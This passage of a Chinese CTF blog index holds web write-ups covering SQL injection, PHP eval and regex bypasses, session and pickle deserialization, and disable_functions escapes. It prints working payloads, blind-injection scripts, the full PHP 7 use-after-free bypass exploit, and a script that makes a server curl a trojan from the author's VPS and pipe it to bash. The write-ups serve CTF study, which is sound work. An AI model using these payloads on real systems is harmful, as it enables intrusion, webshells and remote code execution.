1,2,group_concat(passwoorrd)%20frfromom%20b4bsql%23 [极客大挑战 2019]HardSQL主要考察报错注入，同时还考察对空格过滤的绕过，以及利用left和right截取函数读取完整flag。关于报错注入的讲解，我的博客里还有，在标签里可以找到。 解题本题学到了一个新点：用^代替空格来连接updatexml函数。首先拿库名： /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)%23 注意这里的#一定要用urlencode之后的%23，否则会提示语法错误，也没搞清楚原因，可以参考一下这里，建议在对url进行操作的时候还是都先编码一下。拿到库名：爆表名： /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e),1)%23 这里用到了like，可以参考一下这里查列名 /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1) 拿flag，由于updtexml最多显示32个字符的长度，导致flag显示不全。可以用substr截取，但是发现substr被过滤了，然后参考网上学到了用left和right截取函数分两次把完整的flag查出来了。 /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)%23/check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)%23 [极客大挑战 2019]FinalSQL考察布尔盲注 题目分析进入题目发现多了五个按钮，并且提示中有SQL盲注的字样，猜测就是考它的了。这里可以的地方就是五个按钮了，点击之后发现时用di传参，注入点多半在这里。由于这里传的值是1-5，猜测是布尔盲注，便用常用的姿势测试一下：构造id=1^1和id=1^0发现回显不同，前者返回ERROR!!!(注意这里的返回跟其他错误不一样，其他错误回显是ERROR!)后者是id=1的页面，说明了就是布尔盲注。关于布尔盲注可以参考这里这里需要用到的函数如下： Length（）函数 返回字符串的长度Substr（）截取字符串Ascii（）返回字符的ascii码sleep(n)：将程序挂起一段时间 n为n秒if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 那么构造类似id=1^(length(database())&gt;10)^1的语句，便可以爆破出数据库名的长度，然后再利用id=1^(ascii(substr((select(database())),1,1))&gt;100)^1payload来爆破出数据库名，同理可以爆破出表名和最后的flag。布尔盲注一般都借助python脚本来解，大致的代码逻辑是一样的，这里贴出利用二分爆破的脚本，效率比较高： import reimport requestsimport string url = \"http://127.0.0.1/search.php\"flag = ''def payload(i,j): # sql = \"1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1\"%(i,j) #数据库名字 # sql = \"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1\"%(i,j) #表名 # sql = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1\"%(i,j) #列名 sql = \"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1\"%(i,j) data = {\"id\":sql} r = requests.get(url,params=data) # print (r.url) if \"Click\" in r.text: res = 1 else: res = 0 return res def exp(): global flag for i in range(1,10000) : print(i,':') low = 31 high = 127 while low &lt;= high : mid = (low + high) // 2 res = payload(i,mid) if res : low = mid + 1 else : high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag) exp()print('flag=',flag) 这个题比较坑的就是要读的内容很多，flag也在后面，加上服务器性能和网络性能的原因一直读不全内容，后来多次测试，flag大概在第170个字符后面，将i的起始大小改一下就行了。脚本也可以用于其他布尔盲注的题目，根据题目特点更改即可。 [极客大挑战 2019]RCE ME考察利用PHP 7函数解析特性绕过正则巧取webshell、利用环境变量绕过functions_disable。 题目分析进入题目给出如下源码： &lt;?phperror_reporting(0);if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(\"This is too Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code);}else{ highlight_file(__FILE__);}// ?&gt; 可以看到，需要绕过长度判断和正则，并且这个正则把所有字母和数字都在其中。查资料得知可以利用PHP 7的解析特性来绕过。 这就说明： phpinfo() #php5、php7可执行(phpinfo)() #php7可执行 另外，之前刷题的一篇博客写到过，我们可以利用取反~来绕过对字符的过滤。在php7的环境中，我们可以使用编码转换等形式，将phpinfo转换成一些不可见字符再传入到题目中，这样不仅绕过了正则的匹配，也成功的执行了函数，这里进行编码转换的方式有很多种，常用的有利用^和~ 生成的不可见字符，这里更倾向于使用~求反运算符。 可以利用如下代码生成payload： &lt;?php $shell = phpinfo; echo urlencode(~$shell);?&gt;%8F%97%8F%96%91%99%90 效果如下： 同时也可以看到禁用了很多函数，而assert不再其中，因此可以利用它来拿到shell，先放着。 下一步利用php的函数看一下目录： print_r(scandir('./')); 编码之后为： %8F%8D%96%91%8B%A0%8D # print_r%8C%9C%9E%91%9B%96%8D # scandir 构造如下payload读取当前目录内容： code=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((&quot;./&quot;))); 根目录呢？ 直接用readfile()读取flag文件是读不到的，因为是个二进制文件，那么就需要拿到shell执行readflag来拿到flag了。 而这题拿到shell可以利用前面提到的编码来获取，也可以用之前讲过的利用部分汉字异或来构造POST或GET传参来拿到shell，然后需要bypass functions_disable了。 解题利用如下payload拿到shell： code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27]) 然后蚁剑连上，接下来就是利用环境变量bypass了，最近在不断收集bypass的exp，今天又找到一个。 我们把exp中的bypass_disablefunc_x64.so和bypass_disablefunc.php写入到/var/tmp路径下，然后利用如下payload访问： code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/result&amp;sopath=/var/tmp/bypass_disablefunc_x64.so","link":"/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"},{"title":"高校战\"疫\"部分题解","text":"20多所高校联合出题抗“疫”的比赛，排面也是可以的，来感受一下优秀高校的熏陶。🧐 DAY 1看队友师傅们分享的文章，磕磕碰碰总算也做出了几题 sqlcheckin考察sql注入 解题进入题目，可以直接看源码： &lt;?php // ... $pdo = new PDO('mysql:host=localhost;dbname=sqlsql;charset=utf8;', 'xxx', 'xxx'); $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); $stmt = $pdo-&gt;prepare(\"SELECT username from users where username='${_POST['username']}' and password='${_POST['password']}'\"); $stmt-&gt;execute(); $result = $stmt-&gt;fetchAll(); if (count($result) &gt; 0) { if ($result[0]['username'] == 'admin') { include('flag.php'); exit(); // .... 发现又是用的PDO，前段时间刷题，还有赛题都出现了，这怕是一种趋势。 不过这题不难，尝试了一下，一般的万能密码是不好用了，因为or被ban了，但是通过读代码很容易能发现password处存在注入，or不能用了，但是利用减号可以构造一个password=false的语句，这样就不在判断password了，最后利用 admin/1'-'1登录即可拿到flag。 hackme考察PHP session的反序列化漏洞，主要利用了session.serialize_handler序列化和反序列化采用PHP而导致的漏洞。 题目分析进入题目，首先登录上发现可以更改sign，应该与管理员权限有关。但是抓包也看不出可利用的点。 然后就扫了后台，真的存在源码！在/www.zip路径下，下载之后又是一番代码审计，在profile.php发现了问题： &lt;?phperror_reporting(0);session_save_path('session');include 'lib.php';ini_set('session.serialize_handler', 'php');session_start();class info{ public $admin; public $sign; public function __construct() { $this-&gt;admin = $_SESSION['admin']; $this-&gt;sign = $_SESSION['sign']; } public function __destruct() { echo $this-&gt;sign; if ($this-&gt;admin === 1) { redirect('./core/index.php'); } }}$a = new info();?&gt; 可以看到，这里session.serialize_handler用的是PHP，而init.php中处理器的设置是php_serialize这样就可以参考前面提到的PHP session的漏洞了。再往下审计发现这里定义了info类，其中有admin和sign属性，并且__destruct()中指明如果admin===1就会定向到/core/index.php，这是个什么文件？去看一下： &lt;?phprequire_once('./init.php');error_reporting(0);if (check_session($_SESSION)) { #变成管理员吧，奥利给} else { die('只有管理员才能看到我哟');} 此处无银三百两了，解题的关键肯定在这，但是这个地方会对$_SESSION进行检查，它又包含什么呢？在upload_sign.php下发现了内容： &lt;?phprequire_once('init.php');class upload_sign{ public $sign; public $admin = 0; public function __construct() { if (isset($_POST['sign'])) { $this-&gt;sign = $_POST['sign']; } else { $this-&gt;sign = \"这里空空如也哦\"; } } public function upload() { if ($this-&gt;checksign($this-&gt;sign)) { $_SESSION['sign'] = $this-&gt;sign; $_SESSION['admin'] = $this-&gt;admin; } else { echo \"???\"; } } public function checksign($sign) { return true; }}$a = new upload_sign();$a-&gt;upload(); 可以看到，在这里会对$_SESSION中的admin和sign属性赋值，从这里我们也就可以对session中的admin进行控制了，参考这里，即在设置sign的页面POST一个键值对，并且变量名与session.upload_progress.name相同，即可在session中写入新的内容。 根据这个思路，我们构造payload： ggb0n|O:4:\"info\":2:{s:5:\"admin\";i:1;s:4:\"sign\";s:0:\"\";} 在修改sign的页面抓包，写入payload： 结果成功设置签名： 现在就是admin权限了，到/core/下发现如下代码： ./sandbox/ed04d2f141bd8a57cc5732b0ccf32456 &lt;?phprequire_once('./init.php');error_reporting(0);if (check_session($_SESSION)) { #hint : core/clear.php $sandbox = './sandbox/' . md5(\"Mrk@1xI^\" . $_SERVER['REMOTE_ADDR']); echo $sandbox; @mkdir($sandbox); @chdir($sandbox); if (isset($_POST['url'])) { $url = $_POST['url']; if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match('/(data:\\/\\/)|(&amp;)|(\\|)|(\\.\\/)/i', $url)) { echo \"you are hacker\"; } else { $res = parse_url($url); if (preg_match('/127\\.0\\.0\\.1$/', $res['host'])) { $code = file_get_contents($url); if (strlen($code) &lt;= 4) { @exec($code); } else { echo \"try again\"; } } } } else { echo \"invalid url\"; } } else { highlight_file(__FILE__); }} else { die('只有管理员才能看到我哟');} 可以发现，我们需要利用url进行命令执行，并且data://被ban了，这里想到了ByteCTF一道题的绕过姿势，先放这，url中需要有127.0.0.1才能进一步执行命令，可以参考如何绕过URL限制这篇文章，这里用@来绕过，然后利用compress.zlib://来满足file_get_contents函数的读取，成功过一卡。 'url':'compress.zlib://data:@127.0.0.1/plain;base64,' 正入万山圈子里啊…还要要求执行的命令长度不能超过4…想到了HITCON的一道题，绕过四字符限制getshell，也就是通过把命令拆解成四字符一组来执行命令。 利用命令的执行到VPS上下载木马，然后我们就能拿到shell了！ 理一下解题思路 1、利用PHP session的反序列化漏洞成为admin，读取/core/index.php关键代码 2、利用URL绕过姿势绕过对url的限制 3、利用compress.zlib:进行file_get_contents对文件的读取 4、绕过四字符限制getshell 解题关于解题的第四步还是要好好说一下的，为了下载木马，我把自己的博客都删了… 因为是用curl命令来到VPS上读取木马的代码，因此在VPS上配置好木马文件很重要，做题的时候这里就卡了很久，这一步也需要在本地好好测试，保证木马文件能成功访问。 在VPS上配置好木马文件之后，就可以通过url传参通过四字符执行命令来下载木马，然后浏览器拿shell了。 完整的解题脚本如下： #encoding=utf-8import requestsfrom time import sleepfrom urllib import quoteimport base64s = requests.session()url = \"http://121.36.222.22:88/login.php\"s.post(url, data={'name':'ggb0n'})url1 = \"http://121.36.222.22:88/?page=upload\"s.post(url1, data={'sign':'ggb0n|O:4:\"info\":2:{s:5:\"admin\";i:1;s:4:\"sign\";s:0:\"\";}'})url3 = \"http://121.36.222.22:88/core/index.php\"s.get(url3)ip = 'xx.xx.xx.xx'ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split('.')])payload = [ # 将 \"g&gt; ht- sl\" 写到文件 \"v\" '&gt;dir', '&gt;sl', '&gt;g\\&gt;', '&gt;ht-', '*&gt;v', # 将文件\"v\"中的字符串倒序，放到文件\"x\"，就变成了 \"ls -th &gt;g\" '&gt;rev', '*v&gt;x', # generate `curl orange.tw.tw|python` # generate `curl 10.188.2.20|bash` '&gt;p\\ ', '&gt;ph\\\\', '&gt;a.\\\\', '&gt;\\&gt;\\\\', '&gt;%s\\\\' % ip[8:10], '&gt;%s\\\\' % ip[6:8], '&gt;%s\\\\' % ip[4:6], '&gt;%s\\\\' % ip[2:4], '&gt;%s\\\\' % ip[0:2], '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # getshell 'sh x', 'sh g', ]payload_all = 'compress.zlib://data:@127.0.0.1/plain;base64,{0}'r = requests.get(url3)for i in payload: r = requests.post(url3,data={\"url\":payload_all.format(base64.b64encode(i))}) print r.text print(data['url']) sleep(0.5) 下载木马之后，浏览器拿shell： 整理一下参考的文章：https://www.cnblogs.com/hf99/p/9746038.htmlhttps://xz.aliyun.com/t/6640#toc-10https://www.anquanke.com/post/id/87203 webtmp考察pickle的反序列化利用 题目分析进入题目 可以读源码： import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport secretapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f'Animal(name={self.name!r}, category={self.category!r})' def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read()@app.route('/', methods=['GET', 'POST'])def index(): if request.args.get('source'): return Response(read(__file__), mimetype='text/plain') if request.method == 'POST': try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return 'Are you sure that is an animal???' correct = (result == Animal(secret.name, secret.category)) return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \"Something wrong\" sample_obj = Animal('一给我哩giaogiao', 'Giao') pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) 基于flask的环境，并且采用了pickle 结合题目描述： Sample animal: Animal(name=’一给我哩giaogiao’, category=’Giao’) Pickled data: gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu I will give you the flag if we share the same animal as our favourite. 可知，我们需要构造一个与题目secret中一样的Animal类才能拿到flag，命令执行是不能的，因为R被ban了，我们又不可能知道secret中Animal的属性值。 但是从这篇文章得到了提示：存在b这个指令（call __setstate__ or__dict__.update()），可以更新字典，这样的话我们就可以先覆盖secret中原有的值，然后写入我们构造的键值对到字典中，这样我们就可以再构造Animal类满足题目要求，成功拿到flag了。 参考上面那篇文章的指令集，构造了如下的序列化指令： c__main__\\nsecret\\np0\\n(dp1\\nS'category'\\np2\\nS'ggb0n'\\np3\\nsS'name'\\np4\\nS'ggb0n'\\np5\\nsb. 注意这里的\\n换行符，也是一个巨坑…刚开始在Windows下构造的payload的base64之后提交反馈Somethin wrong，后来经师傅提示说pickle对换行符的\\r不能识别…涨知识… 两种方法： 1、字符串对象.replaceAll(&quot;\\r&quot;, &quot;&quot;); 2、到Linux中去加密 选择了去Linux中加密： #注意在Linux下&gt;&gt;&gt; import base64&gt;&gt;&gt; s = \"c__main__\\nsecret\\np0\\n(dp1\\nS'category'\\np2\\nS'ggb0n'\\np3\\nsS'name'\\np4\\nS'ggb0n'\\np5\\nsb.\"&gt;&gt;&gt; a = base64.b64encode(s)&gt;&gt;&gt; a'Y19fbWFpbl9fCnNlY3JldApwMAooZHAxClMnY2F0ZWdvcnknCnAyClMnZ2diMG4nCnAzCnNTJ25hbWUnCnA0ClMnZ2diMG4nCnA1CnNiLg==' 然后在本地生成个Animal对象： import pickleimport base64class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return \"Animal\" def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryif __name__ == '__main__': a = Animal('ggb0n','ggb0n') print(base64.b64encode(pickle.dumps(a))) 现将第一个payload的base64通过输入框提交反序列化执行覆盖字典，然后再提交我们构造的Animal对象的base64，即可拿到flag： 参考文章：https://www.anquanke.com/post/id/188981#h3-8http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/ PHP-UAF考察functions_disable的绕过，上次I春秋公益赛easy_thinking刚遇到的知识点，前两天在CTFHub上也在刷这方面的题。 题目分析进入题目直接给了小马： &lt;?php$sandbox = '/var/www/html/sandbox/' . md5(\"wdwd\" . $_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if (isset($_REQUEST['cmd'])) { @eval($_REQUEST['cmd']);}highlight_file(__FILE__); 先看一下phpinfo： 是PHP 7版本的，有一个bypass代码可以用，在这里。 然后看一下functions_disable果然ban掉了很多函数： 那么思路就有了： 1、蚁剑连接，上传bypass脚本 2、浏览器访问，获取shell 解题将如下的bypass脚本上传（上次的bypass脚本用不了…）： &lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(\"uname -a\");function pwn($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4 $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(&amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j &gt;= 0; $j--) { $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \"\"; for ($i=0; $i &lt; $m; $i++) { $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; } return $out; } function write(&amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i &lt; $n; $i++) { $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) { $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) { $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { # ELF header return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { # system return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat('A', 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat('A', 79)); trigger_uaf('x'); $abc = $backtrace[1]['args'][0]; $helper = new Helper; $helper-&gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\"Couldn't determine binary base address\"); } if(!($elf = parse_elf($base))) { die(\"Couldn't parse ELF header\"); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\"Couldn't get basic_functions address\"); } if(!($zif_system = get_system($basic_funcs))) { die(\"Couldn't get zif_system address\"); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();}?&gt; 但是web目录没有上传权限…这时候发现web目录下存在sandbox文件夹，这里可以上传，nice！ 然后到浏览器访问/sandbox/bypass7x.php，但是一直不能访问… 但是我们有小马呢，用小马包含一下试试 ?cmd=include(\"sandbox/bypass7x.php\"); 发现成功执行： 然后我们那执行的命令改为/readflag，即可拿到flag： 这题的最后不得不说…搅屎真爽，不过有点可耻。 DAY 2剩下的题目都是高难度了，就出了半个题… nweb考察sql盲注+伪造mysql-server实现任意文件读取，这次是真心体会到，以后盲注脚本还是用ascii码吧，坚决不用字母表了… 题目分析进入题目，发现可以注册登录，登陆上之后flag页面访问无权限，在评论区看到了如下的提示： 猜测注册账户的时候可能存在问题，重新注册，抓包发现存在type参数，并且被置为0： 那这个参数应该就是与等级有关了，后来在注册页面看到提示： 再次抓包更改type=110，登录再次访问flag页，发现可以搜索flag了： 搜索的页面是search.php，注入点肯定就是在这个页面了，参数是flag，经过FUZZ发现，union被ban，select、from需要双写绕过，查看搜索的回显发现，语句错误反馈There is no flag，语句正确反馈There is flag!肯定是盲注了，拿上次I春秋战“疫”赛的盲注脚本改了一下： import requestsurl = 'http://121.37.179.47:1001/search.php'headers = {\"Cookie\": \"PHPSESSID=b2olm04l72i9v25s1orvb28253; username=8837cc3dd80b62a3b5bab3ff2dc91469\"}#payload = \"-1' or (ascii(mid((selselectect database()),{0},1))={1})#\"#payload = \"-1' or (ascii(mid((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database()),{0},1))={1})#\"#payload = \"-1' or (ascii(mid((selselectect group_concat(column_name) frfromom information_schema.columns where table_name='admin'),{0}，1))={1})#\"payload = \"-1' or (ascii(mid((selselectect * frfromom fl4g),{0},1))={1})#\"database = ''for i in range(1, 80): for n in range(30,127): #注意这里有时候导致效率很低 data = { \"flag\": payload.format(i, n), } req = requests.post(url, data=data,headers=headers) if \"There is flag\" in req.text: database += chr(n) print(database) break mysql不区分大小写，就是说如果a不存在，会用A去匹配a…写盲注脚本，如果用字母表的话，这就是个巨坑！还是用ascii码靠谱，不过ascii会匹配较多的字符，爆破速度有时候会很慢，可能因为很多字符请求让服务器500导致的…这一点跑脚本的时候改了半天…还是tcl 跑出库名：ctf-2表名：admin、fl4g、jd、user直接到fl4g表跑flag，跑了几次都没有跑出完整的flag： 后来经队友提示，flag可能是分开存放的，数据库可能只有部分flag。于是想到还有admin表可以去查管理员密码，用脚本跑出密码e2ecea8b80a96fb07f43a2f83c8b0960，md5解密一下得到whoamiadmin，拿去用admin/whoamiadmin登录却说用户名或密码错误…半天都不行…睡了睡了 DAY3醒来发现flag已经被队友交了，密码就是那个，应该是环境出问题了…那么再来学习一下。 管理员登录之后： 根据前半部分flag，想到是mysql蜜罐任意读取文件参考这里，参考github上大师傅写的脚本，放在VPS上监听，然后在浏览器填入VPS地址和端口，利用构造的mysql蜜罐进行任意文件读取flag.php，就能拿到完整的flag了。 赛题环境没了，暂时没法复现了，知道原理，回头再试吧。","link":"/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"XXE攻击","slug":"XXE攻击","link":"/tags/XXE%E6%94%BB%E5%87%BB/"},{"name":"ImageTragick","slug":"ImageTragick","link":"/tags/ImageTragick/"},{"name":"条件竞争","slug":"条件竞争","link":"/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"},{"name":"Cookie攻击","slug":"Cookie攻击","link":"/tags/Cookie%E6%94%BB%E5%87%BB/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"布尔盲注","slug":"布尔盲注","link":"/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"},{"name":"INDA漏洞","slug":"INDA漏洞","link":"/tags/INDA%E6%BC%8F%E6%B4%9E/"},{"name":"HTTP请求伪造","slug":"HTTP请求伪造","link":"/tags/HTTP%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"name":"堆叠注入","slug":"堆叠注入","link":"/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"},{"name":"PHP伪协议","slug":"PHP伪协议","link":"/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"Python反序列化漏洞","slug":"Python反序列化漏洞","link":"/tags/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"Unicode安全问题","slug":"Unicode安全问题","link":"/tags/Unicode%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"name":"JWT伪造","slug":"JWT伪造","link":"/tags/JWT%E4%BC%AA%E9%80%A0/"},{"name":"薅羊毛逻辑漏洞","slug":"薅羊毛逻辑漏洞","link":"/tags/%E8%96%85%E7%BE%8A%E6%AF%9B%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"SSTI模板注入","slug":"SSTI模板注入","link":"/tags/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"MD5强比较","slug":"MD5强比较","link":"/tags/MD5%E5%BC%BA%E6%AF%94%E8%BE%83/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"无参数RCE","slug":"无参数RCE","link":"/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"},{"name":"open-basedir绕过","slug":"open-basedir绕过","link":"/tags/open-basedir%E7%BB%95%E8%BF%87/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"htaccess上传漏洞","slug":"htaccess上传漏洞","link":"/tags/htaccess%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"巧取webshell","slug":"巧取webshell","link":"/tags/%E5%B7%A7%E5%8F%96webshell/"},{"name":"bypass 